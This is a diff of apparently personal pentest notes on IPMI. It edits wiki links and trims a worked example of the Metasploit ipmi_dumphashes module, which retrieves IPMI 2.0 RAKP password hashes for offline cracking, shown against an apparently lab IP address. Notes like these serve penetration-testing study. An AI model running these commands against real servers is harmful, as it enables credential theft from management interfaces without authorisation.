@@ -305,7 +305,7 @@ before authentication takes place
 >   by implementing network segmentation rules
 <!-- }}} -->
 
-1. [[Pentest/Tools/Metasploit/Metasploit]] — IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
+1. [[Metasploit]] — IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
    (*[ipmi_dumphashes](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)*)
 
 ```sh
@@ -315,40 +315,12 @@ use auxiliary/scanner/ipmi/ipmi_dumphashes
 <!-- Example {{{-->
 > [!example]-
 >
-> 1. [[Pentest/Tools/Metasploit/Metasploit#Select Exploit|Select scanner]]
->
 > ```sh
 > msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 > ```
->
-> 2. [[Pentest/Tools/Metasploit/Metasploit#Set Options|Select options]]
->
-> ```sh
-> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
-> ```
->
-> 3. [[Pentest/Tools/Metasploit/Metasploit#Show Options|Show options]]
->
 > ```sh
 > msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
 > ```
->
-> ```sh
-> Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
->
->    Name                 Current Setting                                                    Required  Description
->    ----                 ---------------                                                    --------  -----------
->    CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
->    OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
->    OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
->    PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
->    RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
->    RPORT                623                                                                yes       The target port
->    THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
->    USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
-> ```
->
-> 4. [[Pentest/Tools/Metasploit/Metasploit#Run Exploit|Run the scan]]
 >
 > ```sh
 > msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
@@ -359,10 +331,9 @@ use auxiliary/scanner/ipmi/ipmi_dumphashes
 > [*] Scanned 1 of 1 hosts (100% complete)
 > [*] Auxiliary module execution completed
 >
-> This flaw is a critical component of the [[General|IPMI]] specification
+> This flaw is a critical component of the [[IPMI/General|IPMI]] specification
 > ```
 <!-- }}} -->
-
 
 2. [[IPMI/Exploitation#Hash Cracking|Hash Cracking]]
 
